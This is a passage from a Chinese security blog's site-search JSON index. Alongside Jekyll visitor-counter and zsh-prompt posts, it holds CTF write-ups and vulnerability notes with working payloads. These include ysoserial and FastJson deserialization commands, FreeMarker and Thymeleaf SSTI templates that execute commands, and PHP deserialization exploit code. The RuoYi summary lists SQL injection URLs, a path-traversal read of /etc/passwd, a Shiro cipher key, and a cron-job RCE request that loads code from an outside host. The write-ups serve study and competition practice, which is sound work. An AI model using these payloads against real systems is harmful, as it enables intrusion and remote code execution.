    "content"  : "在上一篇文章中《「Jekyll开发美化」:如何添加访客次数I》我们已经向您介绍了如何获得访客次数，这一篇我们将会把这些数据「悠雅」地利用起来，效果如下：如果您不清楚如何获得访客，可以移步上面的「如何添加访客次数I」链接。技术栈JavaScriptJqueryAjaxCSSFlipClock首先我们需要获得一个展示数据的样式，我们这里选择的是翻页钟的样式，这里是objectivehtml/FlipClock仓库选一个您喜欢的样式把源码获取过来（别忘了给个Star）：第一步新建_includes/extensions/counter.html：&lt;!---FlipClockdesign-@link{https://github.com/objectivehtml/FlipClock}--&gt;&lt;linkrel=\"stylesheet\"href=\"/assets/flipclock/flipclock.css\"&gt;&lt;scriptsrc=\"/assets/flipclock/flipclock.js\"&gt;&lt;/script&gt;&lt;script&gt;$(document).ready(function(){//Instantiateacounterclock_counts=1clock=newFlipClock($('.clock'),clock_counts,{clockFace:'Counter'});&lt;/script&gt;我们可以清楚的看到翻页钟接收了clock_counts并传入clock类，于是我们要想办法把访客参数通过代码的方式获取到并传到clock里即可。第二步通过构建的SuperProxy1中获得的PublicEndpointURL2来实现站点获取Pageviews数据，此之前，我们需要对获取的参数进行处理，可以参考「GAE上创建查询」3进行这一步，对了PublicEndpoint长这样：第三步确认完您后的了PublicEndpoint之后，将以下代码加入您的counter.html中：&lt;script&gt;functiongetGAJson(){letcounts=null$.ajax({url:'yourPublicEndpointURL',dataType:'json',//forcross-originaccesstimeout:1000*10,//10secsasync:false,success:function(data){counts=displayPageviews(data.rows);},error:function(){console.log('FailedtoloadPageviews!');}});returncounts;}functiondisplayPageviews(rows){if(rows===undefined){return;}varcurPath=window.location.pathname;varcurFile=curPath.slice(curPath.lastIndexOf('/')+1);//Sometimespostswillbemoved.varlen=rows.length;varcnt=0;for(vari=0;i&lt;len;++i){vargaPath=rows[i][0];vargaFile=gaPath.slice(gaPath.lastIndexOf('/')+1);if(gaPath===curPath||gaFile===curFile){cnt+=parseInt(rows[i][1]);}}returnsetInitialCount(cnt);//ref@link//-{https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE}//-{https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/}}//&lt;!--@link{https://profile-counter.glitch.me/bin4xin.github.io/count.svg}--&gt;functionsetInitialCount(num){//varinit_SiteOffset=66749;//_value_site_pv=parseInt(num)//all_counts=init_SiteOffset+_value_site_pv//returnall_counts//如果您不从0开始计次，使用上面的代码，并注释掉下面的returnreturnnum}&lt;/script&gt;然后传给clock就行了：&lt;script&gt;letAll_Counts=getGAJson()$(document).ready(function(){//Instantiateacounterclock=newFlipClock($('.clock'),All_Counts,{clockFace:'Counter'});&lt;/script&gt;数据持久化如果不想实时去访问API，可以做一个数据持久化，我的思路是这样的：JSON文件本地存储Action持久层第一步i.下载yourPublicEndpointURL的JSON数据；ii.修改Ajax中的url为assets/ga.json；第二步i.添加.github/workflows/deploy.yml4curl${{secrets.GA_API}}&gt;assets/ga.jsonii.为仓库添加GA_APIsecretsiii.Push这样我们就实现了数据持久化，防止远端API犯病的情况，同时加快了站点访问速度；同样，由于Google的API是有免费额度的，像：BuildApi是一天2个小时的构建时长；Appspots的免费配额参考配额正常访问是不会有过溢的现象导致付费，所以在测试中，尽量减少外力干扰。REF《「Jekyll开发美化」:如何添加访客次数I》 &#8617;从GoogleAnalytics获取Pageviews &#8617;GAE上创建查询 &#8617;bin4xin.github.io::deploy.yml#L46 &#8617;"
  },

  {
    "title"    : "「Jekyll开发美化」:如何添加访客次数 I",
    "category" : "",
    "tags"     : "Development, Jekyll, GA, SuperProxy",
    "url"      : "/blog/2022/Jekyll-devOps-how-to-add-vistor-and-times-I/",
    "date"     : "Nov 18, 2022",
    "content"  : "我们已经迫不及待地向您介绍这些”过时的技术”：大致思路1：通过GoogleAppEngine搭建superProxy,开启其GA权限;设置对应查询query以及更新频率;获取json结果生成地址;通过js请求获取json数据,解析展现;加入本地pageview文件备份容错;技术栈GoogleAppspotGoogleAppengineBuildApi构建superProxyGoogleAnalyticsApisuperProxy接入AnalyticsApi，拿到Analytics数据给superProxy添加一个私有域（认证）在APIAccesspane中创建一个OAuth基本方法1可以参考：《如何给Jekyll博文添加阅读数显示》我这儿根据过程提供一些过来建议。BUILD[Permissionserror]Pleasemakesurethatyouhavepermissiontoviewapplicationsontheprojectandthat**@**.comhastheAppEngineDeployer(roles/appengine.deployer)role.如上，报AppEngineDeployer(roles/appengine.deployer)role.的错，也就是构建者权限的问题；第一步：需要进入GoogleClouddashboard查看您是否开启了Build的Api在【已启用的API和服务中】找【CloudBuildApi】，没有开启可以搜索BuildApi把她开启：第二步：进入iamadminpanel找到终端报权限错误的用户，给这个用户赋权，（就是说这个用户现在没有构建的权限，我们给她赋上权就行），在这里的示例就是***@**.com找到【AppEngine】下的【Deployer】权限：BUILD[invalid_client]{u'error_description':u'Unauthorized',u'error':u'invalid_client'}构建完成后，访问superProxy，返回invalid_client。第一步进入Gcloud【凭据服务】，找到新建的OAuth2.0客户端ID-&gt;【重置Secret】；第二步保持apis/credentials获得的两个Secret与Build的代码：https://{your-app-id}.appspot.com与src/config.py中OAUTH_REDIRECT_URI保持一致Build[fetchingapplication]ERROR:(gcloud.app.deploy)Permissionserrorfetchingapplication[apps/**-your-**-project**].Pleasemakesurethatyouhavepermissiontoviewapplicationsontheprojectandthat***@**.comhastheAppEngineDeployer(roles/appengine.deployer)role.第一步如果报的权限错误是跟application有关，跟用户无关，那么大概率是您的本地sdk配置存在配置问题2：进入【appengine】-&gt;header处【选择项目】，而针对此错误需要修改您本地默认project-id，id参考如下：希望能够帮助您在构建Appspot/构建superProxy/OAuth时帮到您，如果有任何问题请在下方点击needhelp提交issues。REF《如何给Jekyll博文添加阅读数显示》 &#8617; &#8617;2AppEngine错误问题排查 &#8617;"
  },

  {
    "title"    : "2022年网鼎杯玄武组赛题复盘-[Web-ezJava]",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-WEB-ezJava-Walkthrough/",
    "date"     : "Nov 5, 2022",
    "content"  : "Web-ezJava赛题复盘路由绕过payloadhttp://localhost/;Evil绕过if(path.startsWith(\"/Evil\"))@ResponseBody@RequestMapping({\"/Evil\"})publicStringEvil(HttpServletRequestrequest,HttpServletResponseresponse)throwsIOException,ClassNotFoundException{Stringpath=request.getRequestURI();if(path.startsWith(\"/Evil\"))return\"nonono!!!\";Stringbase=request.getParameter(\"base\");EInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));Objecta=in.readObject();return\"OK\";}EInputStreamEInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));我们可以看到路由下base64解码了base参数，并传给了EInputStream，而我们本地调试修改成ObjectInputStream1：ObjectInputStreamin=newObjectInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));可以直接RCE：所以可以看到,有很明显的反序列化的地方，不过需要做一些绕过，通过重写ObjectInputStream::resolveClass方法来实现的2；GadgetURLDNS使用URLDNSGadget测试一下：java-jarysoserial.jarJRMPClient\"localhost:1099\"|base64java-cpysoserial.jarysoserial.exploit.JRMPListener1099URLDNS\"http://dnslog\"攻击成功：Morevideoinfoforabove:YouTubeBiliBili不良视频反馈&nbsp;|&nbsp;Inappropriatevideofeedback.RCE所以为了RCE去查看了lib，本地服务没有可以直接调用的Gadget，尝试一些ccGadget发现报错：ERROR1---[nio-8080-exec-9]o.a.c.c.C.[.[.[/].[dispatcherServlet]:Servlet.service()forservlet[dispatcherServlet]incontextwithpath[]threwexception[Requestprocessingfailed;nestedexceptionisjava.lang.IllegalArgumentException:Illegalbase64character20]withrootcausejava.lang.IllegalArgumentException:Illegalbase64character20\tatjava.util.Base64$Decoder.decode0(Base64.java:714)~[na:1.8.0_171]······\tatjava.lang.Thread.run(Thread.java:748)[na:1.8.0_171]解法我们回头看依赖：&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;&lt;version&gt;1.2.48&lt;/version&gt;&lt;/dependency&gt;找到教程说是通过FastJson进行二次反序列化3addpayloaderror[ERROR]/Users/bin4xin/.../FastJson.java:[3,27]错误:程序包com.alibaba.fastjson不存在添加jar到本地仓库mvninstall:install-file-Dfile=/Users/bin4xin/path/to/fastjson-1.2.48.jar-DgroupId=com.alibaba-DartifactId=fastjson-Dversion=1.2.48-Dpackaging=jarjava-jarysoserial-0.0.6-SNAPSHOT-all.jarYSOSERIAL?Usage:java-jarysoserial-[version]-all.jar[payload]'[command]'···FastJson···JRMPClient_bypass_jep_jdk241expjava-jarysoserial-0.0.6-SNAPSHOT-all.jarJRMPClient_bypass_jep_jdk241\"127.0.0.1:1099\"|base64java-cpysoserial-0.0.6-SNAPSHOT-all.jarysoserial.exploit.JRMPListener1099FastJson\"open/System/Applications/Calculator.app\"调用：javax.management.BadAttributeValueExpException#readObjectcom.alibaba.fastjson.JSON#toJSONStringcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties报错：Servlet.service()forservlet[dispatcherServlet]incontextwithpath[]threwexception[Requestprocessingfailed;nestedexceptionisjava.lang.IllegalArgumentException:Illegalbase64character20]withrootcausejava.lang.IllegalArgumentException:Illegalbase64character20atjava.util.Base64$Decoder.decode0(Base64.java:714)~[na:1.8.0_181]解决：成功：REF以上，完结。EasySpringMVC（java反序列化） &#8617;JRMP安全问题分析-从CVE到CTF &#8617;java二次反序列化初探 &#8617;"
  },

  {
    "title"    : "2022年全省通信和互联网行业职业技能竞赛 WriteUp",
    "category" : "",
    "tags"     : "CTF, WriteUp",
    "url"      : "/blog/2022/Provincial-Communication-and-Internet-Industry-Vocational-Skills-Competition/",
    "date"     : "Nov 4, 2022",
    "content"  : "#1.WebPHPserialize反序列化考点；题意：定义了两个class，classA是去找传入进来的文件位置并做if存在判断，过程中对$filepath做base64解码；classA{public$files;publicfunctionfindFile(){echo$this-&gt;files;if(file_exists(base64_decode($this-&gt;files-&gt;filepath))){echo\"Thisisafile\";}else{echo\"Filenotfound\";}}publicfunction__destruct(){$this-&gt;findFile();}}第二个classB是对传入的$filepath做了一个简单的过滤判断，如果传入的字符符合/flag，那么就直接退出报die(\"no\")；classB{public$filepath;publicfunctionshutdown(){die(\"no\");}publicfunction__toString(){$result=$this-&gt;filepath;if(strstr($result,\"L2ZsYWc\")||strlen($result)&gt;8){$this-&gt;shutdown();}$result=base64_decode($result);$content=file_get_contents($result);echo$content;return\"\";}}最后就针对传入的参数做反序列化：@$a=$_GET['a'];@unserialize(base64_decode($a));所以定义两个函数传入$filepath，序列化后对字符串进行base64编码即可：exp&lt;?phpclassA{public$files;}classB{public$filepath;}$a=newA();$b=newB();$a-&gt;files=$b;$b-&gt;filepath=\"Ly9mbGFn\";echobase64_encode(serialize($a));?&gt;php7exp.php#2.WebFunnyJava题目给出了一个Jar包；IDEA引用lib直接反编译直接定位Controller：SearchControllerFunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/Controller/Search.class@RequestMapping(value={\"/search\"},method={RequestMethod.GET,RequestMethod.POST})@ResponseBodypublicStringsearch(HttpServletRequestrequest,HttpServletResponseresponse){Stringsearch=request.getParameter(\"search\");if(search==null){search=\"search.html\";}···returncontent;}一个/Search功能，提供search参数返回相关内容；解析模版可以通过以下类中看到1：FunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/util/ParserUtil.classStringbuildTempletPath=BasicUtil.getRealPath(context,\"\")+\"templates\"+File.separator;EditorController第二个是一个ueditor的路由定义：@RequestMapping({\"/static/plugins/ueditor/{version}/jsp\"})···{···@RequestMapping({\"editor\"})publicStringeditor(HttpServletRequestrequest,HttpServletResponseresponse,StringjsonConfig){···}}应该是一个上传功能的路由定义，但是我们看完两个Controller还暂时没有思路，上传点这里我们暂时放下不表；解题思路Search功能我们可以看到默认解析的是webapp中的search.html并返回；Editor上传功能也有可能我们找到上传点，可以直接getshell；所以目前有两个思路：思路一：Search直接模版解析RCE；思路二：Editor上传getShell；本地调试思路一：importfreemarker.core.ParseException;importfreemarker.template.MalformedTemplateNameException;importfreemarker.template.TemplateNotFoundException;我们可以看到搜索功能下导入的模版解析库；我们搜索关键词Freemarker模板注入，可以看到网上很多相关文章，而且在Jar包中其实也给了我们提示：FunnyJava.jar!/BOOT-INF/classes/templates/1647232439869.htm我们直接本地起环境，把代码放到模版位置，查看运行情况：&lt;#assignexec=\"freemarker.template.utility.Execute\"?new()&gt;${exec(\"id\")}我们可以看到，模版解析RCE。所以思路一没问题，那么我们应该怎么把我们生成的模版让服务器去执行呢？思路二：显然，需要通过ueditor的上传功能上传到webapp/templates目录下（前面已经解释目录来源），然后通过search功能来解析我们的恶意模版来达到RCE的目的；上传点突破我们通过前面Editor的路由定义来找到路由如何访问，并定义相关参数上传我们的模版：根据@RequestMapping的定义和ueditor的相关用法，找到上传的路由为：http://localhost:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimagepayload：&lt;formaction=\"http://localhost:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimage\"method=\"post\"enctype=\"multipart/form-data\"&gt;&lt;div&gt;&lt;inputtype=\"file\"multiple=\"multiple\"accept=\"image/*\"name=\"image\"&gt;&lt;/div&gt;&lt;div&gt;&lt;inputtype=\"submit\"value=\"上传\"&gt;&lt;/div&gt;&lt;/form&gt;不过构造完payload上传后会一直提示IO错误；考虑有可能是写入文件格式不正确；REFFreeMarker模板开发中StringTemplateLoader的用法 &#8617;"
  },

  {
    "title"    : "CVE-2022-40664 Shiro Bypass研究历程",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CVE-2022-40664-Research-Walkthrough/",
    "date"     : "Oct 26, 2022",
    "content"  : "ApacheShirobefore1.10.0,AuthenticationBypassVulnerabilityinShirowhenforwardingorincludingviaRequestDispatcher.1YouTubeBiliBili不良视频反馈&nbsp;|&nbsp;Inappropriatevideofeedback.walkthrough2GET/admin/auth_passHTTP/1.1GET/admin/authHTTP/1.1GET/admin/authHTTP/1.1Token:4ra1nexchangeredirectfromforward?3@RequestMapping(\"/admin/{value}\")publicStringCVE_2022_40664_bypass(@PathVariableStringvalue,HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{System.out.println(\"===========/admin\"+((HttpServletRequest)request).getRequestURI()+\"/===========\");//request.getRequestDispatcher(\"/admin/auth\").forward(request,response);//return\"forward:\"+((HttpServletRequest)request).getRequestURI();response.sendRedirect(\"/admin/auth\");return(\"Redirect:/admin/auth\");}forward4request.getRequestDispatcher(\"/admin/auth\").forward(request,response);shiro1.10.0DefineBean5SecurityManager6@BeanpublicMyShiroFilterFactoryBeanfilterRegBean(SecurityManagersecurityManager)throwsException{//CVE-2022-40664//fixedconfShiroFilterConfigurationconf=newShiroFilterConfiguration();conf.setFilterOncePerRequest(false);ShiroFilterFactoryBeanshiroFilterFactoryBean=newShiroFilterFactoryBean();shiroFilterFactoryBean.setSecurityManager(securityManager);shiroFilterFactoryBean.setShiroFilterConfiguration(conf);AbstractShiroFilterfilter=shiroFilterFactoryBean.getObject();MyShiroFilterFactoryBeanreg=newMyShiroFilterFactoryBean();reg.setFilter(filter);reg.addUrlPattern(\"/*\");reg.setName(\"shiroFilter\");reg.setSecurityManager(securityManager);reg.setDispatcherTypes(EnumSet.allOf(DispatcherType.class));//fixedconfend.returnreg;}Donotwork.reference[ANNOUNCE][CVE-2022-32532]ApacheShiro1.9.1released &#8617;Lay0us1/CVE-2022-32532 &#8617;CVE-2022-40664 &#8617;Shiro1.7和1.10对于forward请求的处理 &#8617;definingabeannamed‘shiroFilterFactoryBean’ &#8617;SpringBoot整合shiro-spring-boot-web-starter &#8617;"
  },

  {
    "title"    : "::若依:: vulnerability summary",
    "category" : "",
    "tags"     : "CVE, 信息搜集, vulnerability",
    "url"      : "/blog/2022/ruoyi-vuln-summary/",
    "date"     : "Oct 8, 2022",
    "content"  : "SQLinjectsqli-1/prod-api/system/user/list?pageSize=&amp;params%5bdataScope%5d=and%20extractvalue(1,concat(0x7e,(select%20user()),0x7e))sqli-2/prod-api/system/role/list?params%5bdataScope%5d=and+extractvalue(1,concat(0x7e,(select+database()),0x7e))CRONjobRCEcreatePOST/prod-api/monitor/jobHTTP/1.1Host:***User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:104.0)Gecko/20100101Firefox/104.0Accept:application/json,text/plain,*/*Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding:gzip,deflateContent-Type:application/json;charset=utf-8{\"jobName\":\"123\",\"jobGroup\":\"DEFAULT\",\"invokeTarget\":\"org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager[!!java.net.URLClassLoader[[!!java.net.URL[\\\"http://fwgl.ahjkjt.com.6541b.11e4.bnslog.top\\\"]]]]')\",\"cronExpression\":\"0/20****?\",\"misfirePolicy\":1,\"concurrent\":\"0\",\"status\":\"0\"}list/prod-api/monitor/job/listrunPUT/prod-api/monitor/job/runHTTP/1.1Host:***User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:104.0)Gecko/20100101Firefox/104.0Accept:application/json,text/plain,*/*Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding:gzip,deflateContent-Type:application/json;charset=utf-8{\"jobId\":8,\"jobGroup\":\"DEFAULT\"}localfileread/common/download/resource?resource=/profile/../../../../etc/passwdthymeleafSSTIRCEPOST/monitor/cache/getNamesHTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open-aCalculator')}__::.xPOST/prod-api/monitor/cache/getNamesHTTP/1.1fragment=__${T%20(java.lang.Runtime).getRuntime().exec('open-aCalculator')}__::.xShiroCipherKey=fCq+/xW488hMTCD+cmJ3aQ==refRuoYi若依"
  },

  {
    "title"    : "ICT network security CTF 2022 walkthrough",
    "category" : "",
    "tags"     : "笔记, CTF",
    "url"      : "/blog/2022/ICT-network-security-CTF/",
    "date"     : "Sep 30, 2022",
    "content"  : "Misc奇怪的AES题目代码fromCrypto.CipherimportAESdeff(x):return(x-2)**3deffd(x):return3*((x-2)**2)defnewtonMethod(n,assum):time=nx=assuma=f(x)b=fd(x)iff(x)==0.0:returntime,xelse:next=x-a/bifa-f(next)&lt;1e-6:key=str(x)[-16:]*2returnkeyelse:returnnewtonMethod(n+1,next)defFake_CBC(key,plain):iflen(key)!=32:return\"error!\"cipher_txt=b\"\"cipher_arr=[]cipher=AES.new(key,AES.MODE_ECB)plain=[plain[i:i+32]foriinrange(0,len(plain),32)]plain_bytes=[]foriinrange(len(plain)):plain_bytes.append(bytes(plain[i],encoding=\"utf-8\"))cipher_arr.append(cipher.encrypt(plain_bytes[0]))cipher_txt+=cipher_arr[0]foriinrange(1,len(plain)):cipher=AES.new(cipher_arr[i-1],AES.MODE_ECB)cipher_arr.append(cipher.encrypt(plain_bytes[i]))cipher_txt+=cipher_arr[i]returncipher_txtkey=bytes(newtonMethod(0,X0),encoding=\"utf-8\")withopen(\"flag.txt\",\"r\")asff:s=ff.read()ff.close()withopen(\"flag_cipher\",\"wb\")asff:ff.write(Fake_CBC(key,s))ff.close()exp代码fromCrypto.CipherimportAESforX0inrange(0,11):deff(x):return(x-2)**3deffd(x):return3*((x-2)**2)defnewtonMethod(n,assum):time=nx=assuma=f(x)b=fd(x)iff(x)==0.0:returntime,xelse:next=x-a/bifa-f(next)&lt;1e-6:key=str(x)[-16:]*2returnkeyelse:returnnewtonMethod(n+1,next)print(X0)try:key=bytes(newtonMethod(0,X0),encoding=\"utf-8\")withopen(r'flag_cipher','rb')asf:s=f.read()cipher=AES.new(key,AES.MODE_ECB)aes=AES.new(s[:32],AES.MODE_ECB)t=aes.decrypt(s[32:64])print(cipher.decrypt(s[:32])+t)exceptExceptionase:print(e)得到flageye$binwalk-Meye.jpg发现zip文件$7zal7B86.zip展示zip包含的文件名$7zal-slt7B86.zip查看CRC32Path=1.txtAccessed=2022-04-2213:27:39Attributes=A···Encrypted=+Comment=CRC=0F84C81E···CRC32爆破：python2crc32.pyreverse0x0f84c81e依次类推，得到zip解压密码ohhh_you_found_me;本章节主要记录mac下针对该类赛题的命令使用方法，包括查看zip包含的文件名以及对应的CRC32值，后面的过程略。参考[1].2022年第三届电信和互联网行业职业技能竞赛WriteUp[2].WriteUp|第三届电信&amp;互联网行业职业技能竞赛解题思路分享~"
  },

  {
    "title"    : "Industrial Internet CTF 2022 walkthrough",
    "category" : "",
    "tags"     : "笔记, CTF",
    "url"      : "/blog/2022/Industrial-Internet-CTF-2022/",
    "date"     : "Sep 25, 2022",
    "content"  : "2022工业互联网CTF一道WEB；#0x01、考点file_get_contentfuzzing内容文件读取；$_GET型include_once本地文件包含。#1x01、绕过给出的url主页面有一个链接指向到read.php?Book=ZGRsLnR4dA==，是ddl.txtBase64编码，尝试了一些Linux下的绝对路径文件Base64payload页面提示回显book/Base64payload不存在根据提示read.php应该读取的是book目录下文件，查看了一下book目录，发现中间件开启了auto_index，只有一个文本文件；尝试目录穿越payload，具体提示忘了，即猜测对../做了一些操作。于是尝试了：../url编码、双写绕过，发现双写绕过/read.php?Book=Li4uLy4vcmVhZC5waHA=可以读取：我们可以看到操作代码：str_replace(array(\"../\",\"..\\\"\"),\"\",$file)#2x01、hint进一步使用组合爆破：Base64（..././..././..././+文件路径）发现：.bash_history文件：cd/var/www/ctf/lscdV72J1dn23wjFrqcat*.php我们可以看到文件中的hint，而且根据1x01章节我们直接访问urlhttp://eci-2zeblmhade5fptwofhr8.cloudeci1.ichunqiu.com/V72J1dn23wjFrq/可以直接看到demo.php文件直接读取：&lt;?phperror_reporting(0);$file=$_GET['ops'];$file=str_replace(array(\"../\",\"..\\\"\"),\"\",$file);include_once($file);\t?&gt;#3x01、文件包含基本步骤：ops=file:///etc/passwd读取相关文件，找到日志路径；日志文件写入webshell过程2可以参考文件[1]不过当时时间较为紧张，暂未完成这一步，有些遗憾。参考[1].VulnHub–DC-5"
  },

  {
    "title"    : "2022年网鼎杯玄武组赛题复盘-[Web-FindIT]",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-WEB-FindIT-Walkthrough/",
    "date"     : "Sep 21, 2022",
    "content"  : "Web-FindIT赛题复盘本文主要参考《2022网鼎杯玄武组-youcanfindit题解—Spring通用MemShell改造》参考进行复盘；实际上我们一开始拿到jar包也是尝试几个路由是否存在SSTI漏洞，不过CTF基本上通用的payload1基本上是不生效的：#SSTIpayload及绕过复现我们直接把payload2拿过来：/doc/;/__$%7BT%20(java.lang.Runtime).getRuntime().exec(%22id%22)%7D__::main.x可以看到console报错UnixProcess说明命令注入成功了的：2022-09-2206:50:03.785INFO1---[nio-8080-exec-2]c.e.demo.controller.IndexController:info:__${T(java.lang.Runtime).getRuntime().exec(\"id\")}__::main.x2022-09-2206:50:04.004ERROR1---[nio-8080-exec-2]org.thymeleaf.TemplateEngine:[THYMELEAF][http-nio-8080-exec-2]Exceptionprocessingtemplate\"doc/java.lang.UNIXProcess@1331b3c8::[main]\":Errorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8],templatemightnotexistormightnotbeaccessiblebyanyoftheconfiguredTemplateResolversorg.thymeleaf.exceptions.TemplateInputException:Errorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8],templatemightnotexistormightnotbeaccessiblebyanyoftheconfiguredTemplateResolvers不过我们同样尝试写入payload注入内存马时却报错我们观察一下发现和之前的console报错时不一样的：Errorresolvingtemplate[doc/java.lang.UNIXProcess@1331b3c8]成功应该是注入代码成功被识别成模版，然后汇报模版解析过程的问题（如上）；而失败则并未被识别成模版（如下）：java.lang.IllegalArgumentException:Invalidtemplatenamespecification:不过通过以上的payload确实是可以成功RCE的：我们需要根据参考2生成内存马，实现效果如下：所以下一步是需要根据payload生成持久化的shell3，因为机器不出网，且没有回显；所以我们尝试搞清楚：1.用了@ResponseBody注解的路由，不存在漏洞；2.没有使用@ResponseBody进行注解的路由，因此即使没有return情况下也是可注入的。如果#@ResponseBody我们找到了官方文档4一些大牛的解答，就不在这里班门弄斧了，引用《ThymeleafSSTI漏洞分析》参考原文5：问题1：配置了ResponseBody注解确实无法触发，经过调试在applyDefaultViewName中ModelAndView是Null，而非ModelAndView对象，所以hasView()会异常，不会设置视图名。更多移步配置ResponseBody或RestController注解问题2：引用参考文章第四章分析了SpingMVC视图解析的过程，在解析视图首先获取返回值并封装为ModleAndView，而在当前当前环境中并没有返回值，按理说ModelAndView应该为空，为什么还能正常得到ModleAndView呢？原因主要在DispatcherServlet#doDispatch中，获取ModleAndView后还会执行applyDefaultViewName方法。更多移步urlPath中传入Payload可以执行参考Thymeleaf模板注入命令执行 &#8617;2022网鼎杯玄武组-youcanfindit题解—Spring通用MemShell改造 &#8617;CTF-you-can-find-it(2022网鼎杯玄武组webctfthymeleafSSTIbypassandmemshelltoretriveflag) &#8617;Thymeleaf3.0.12—ReleaseNotes &#8617;ThymeleafSSTI漏洞分析 &#8617;"
  },

  {
    "title"    : "互联网的记忆",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2022/Memroy-Of-Internet-FromCHN-Bybin4xin/",
    "date"     : "Sep 9, 2022",
    "content"  : "zsh的显示优化配置，我们自定义了一些「经典语录」，加入了zsh显示区域，这里实现的主要难点在于：我们很容易把「经典语录」加入到数组里面，不过我们希望，在每次打开terminal时，都有一些惊喜的感受;)定义一个「经典语录」数组我们先摘抄一些「经典语录」，把它放入数组，并根据自己的喜好「粉饰」：declare-aexpressions=('📣WhatareY0uf4ckingbarking.📣''📣WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).📣''~~APPEARANCEISTHEFIRSTPRODUCTIVEFORCE~~;')就比如上面'📣WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).📣'，前后加上两个喇叭emoji的初衷是表示强调，并且后面加上了语气词（doge）。颜值是第一生产力到此时，我们已经有一个可用的数组了，那么下一步就是需要把它「悠亚」地输出出来，怎么能够实现前者，又能「惊喜」呢？很简单，我们定义了一个简单算法：计算出数组大小index[array]然后随机在[0,index[arrary]]区间中输出对应的「经典语录」就好了于2022-10-0315:35:09+0800修改#index=$((0+$RANDOM%${#expressions[@]}))#重新定义了一个随机算法，上面可能导致在数组中取出空数据。index=$((1+$random_index))random_index=$(($RANDOM%${#expressions[@]}))selected_expression=${expressions[index]}第一步重点在于防止生成随机数导致区间过大，最终的输出为空；此时，我们的大体轮廓就已经完成了，把它封装你在狗叫什么函数封装后，告诉zsh调用它就好，整个代码如下：msg_header(){declare-aexpressions=('📣WhatareY0uf4ckingbarking.📣''📣WeareallF4CKINGSMALL-TOWNSWOT(LOUDLY).📣''~~APPEARANCEISTHEFIRSTPRODUCTIVEFORCE~~;')index=$((0+$RANDOM%${#expressions[@]}))selected_expression=${expressions[index]}echo$selected_expression}PROMPT=\"%(?:%{$fg_bold[green]%}[$(msg_header)]:%{$fg_bold[red]%}[Ooooooops@@S0methingWROOONG@@])\"PROMPT+='%{$fg[cyan]%}[🤑🎧🚩:&lt;%c&gt;]%{$reset_color%}$(git_prompt_info)%{$fg_bold[white]%}$%{$fg_bold[green]%}$%{$fg_bold[yellow]%}$'ZSH_THEME_GIT_PROMPT_PREFIX=\"%{$fg_bold[yellow]%}[%{$fg_bold[blue]%}&lt;git:%{$fg[red]%}\"ZSH_THEME_GIT_PROMPT_SUFFIX=\"%{$reset_color%}%{$fg_bold[yellow]%}]\"ZSH_THEME_GIT_PROMPT_DIRTY=\"%{$fg[blue]%}&gt;%{$fg[yellow]%}%{$fg_bold[yellow]%}]\"ZSH_THEME_GIT_PROMPT_CLEAN=\"%{$fg[blue]%}&gt;\"于2022-10-0315:35:09+0800修改当下效果代码：bigger-than-bigger::robbyrussell.zsh-theme效果参考[1].杨时旸.科学家和演员是平等的，社会收入分配自然有市场去调节，有法制去监督以上。"
  },

  {
    "title"    : "2022年网鼎杯玄武组-解题记录",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2022-Walkthrough/",
    "date"     : "Sep 7, 2022",
    "content"  : "零：WEB#0x00web237-openlitespeedSSRF&lt;?phphighlight_file(__FILE__);if(isset($_POST[\"curl_opt\"])&amp;&amp;is_array($_POST[\"curl_opt\"])){$ch=curl_init();foreach($_POST[\"curl_opt\"]as$key=&gt;$value){curl_setopt($ch,$key,$value);}$result=curl_exec($ch);curl_close($ch);echo$result;}?&gt;ssrf尝试写shell失败：#0x01web441-ezjava路由绕过payloadhttp://localhost/;Evil绕过if(path.startsWith(\"/Evil\"))@ResponseBody@RequestMapping({\"/Evil\"})publicStringEvil(HttpServletRequestrequest,HttpServletResponseresponse)throwsIOException,ClassNotFoundException{Stringpath=request.getRequestURI();if(path.startsWith(\"/Evil\"))return\"nonono!!!\";Stringbase=request.getParameter(\"base\");EInputStreamin=newEInputStream(newByteArrayInputStream(Base64.getDecoder().decode(base)));Objecta=in.readObject();return\"OK\";}base参数如何？进一步查看writeUp："
  },

  {
    "title"    : "Apache Log4J2 RCE JDK限制实验",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Apache-log4j2-affect-By-JDK-version-walkthrough/",
    "date"     : "Jul 9, 2022",
